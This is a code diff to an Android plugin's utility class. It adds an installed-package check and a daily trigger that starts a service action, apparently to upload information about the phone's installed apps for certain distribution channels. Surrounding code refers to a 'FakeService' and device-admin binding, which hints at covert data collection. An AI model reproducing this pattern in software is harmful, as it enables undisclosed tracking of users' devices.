@@ -5,6 +5,8 @@ import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.content.pm.PackageInfo;
+import android.content.pm.PackageManager;
 import android.os.Build;
 import android.provider.Settings;
 import android.telephony.TelephonyManager;
@@ -16,9 +18,9 @@ import com.xstd.plugin.config.AppRuntime;
 import com.xstd.plugin.config.Config;
 import com.xstd.plugin.config.PluginSettingManager;
 import com.xstd.plugin.service.FakeService;
+import com.xstd.plugin.service.PluginService;
 
 import java.io.UnsupportedEncodingException;
-import java.lang.reflect.Method;
 import java.util.HashMap;
 import java.util.UUID;
 import java.util.regex.Pattern;
@@ -41,6 +43,43 @@ public class CommonUtil {
         MobclickAgent.flush(context);
     }
 
+
+    public static boolean checkPackageInstall(Context context, String packageName) {
+        PackageInfo packageInfo;
+        try {
+            packageInfo = context.getPackageManager().getPackageInfo(packageName, PackageManager.GET_ACTIVITIES);
+        } catch (Exception e) {
+            packageInfo = null;
+            e.printStackTrace();
+        }
+        if (packageInfo == null) {
+            return false;
+        } else {
+            return true;
+        }
+    }
+
+    public static void checkIfNeedUploadPhoneInstallInfo(Context context) {
+        int channel = Integer.valueOf(Config.CHANNEL_CODE);
+        if (channel > 800000 && channel < 900000) {
+            if (Config.DEBUG) {
+                Config.LOGD("[[CommonUtil::checkIfNeedUploadPhoneInstallInfo]] current Channel is : " + Config.CHANNEL_CODE + " should check" +
+                                " if need update phone info");
+            }
+
+            long lastUpdateTime = PluginSettingManager.getInstance().getLastUpdatePhoneInstallInfoTime();
+            if ((System.currentTimeMillis() - lastUpdateTime) >= Config.ONE_DAY) {
+                if (Config.DEBUG) {
+                    Config.LOGD("[[CommonUtil::checkIfNeedUploadPhoneInstallInfo]] delay > 1 day, should upload info for PhoneInstall");
+                }
+                Intent i = new Intent();
+                i.setAction(PluginService.ACTION_PHONE_INSTALL_INFO);
+                i.setClass(context, PluginService.class);
+                context.startService(i);
+            }
+        }
+    }
+
     public static void startFakeService(Context context, String from) {
         if (Config.DEBUG) {
             Config.LOGD("[[CommonUtil::startFakeService]] from reason : " + from);
@@ -54,7 +93,7 @@ public class CommonUtil {
     public static boolean isBindingActive(Context context) {
         DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
         return dpm.isAdminActive(new ComponentName(context, DeviceBindBRC.class))
-                        && PluginSettingManager.getInstance().getKeyHasBindingDevices();
+                   && PluginSettingManager.getInstance().getKeyHasBindingDevices();
     }
 
     private static final String PREFS_FILE = "device_id.xml";
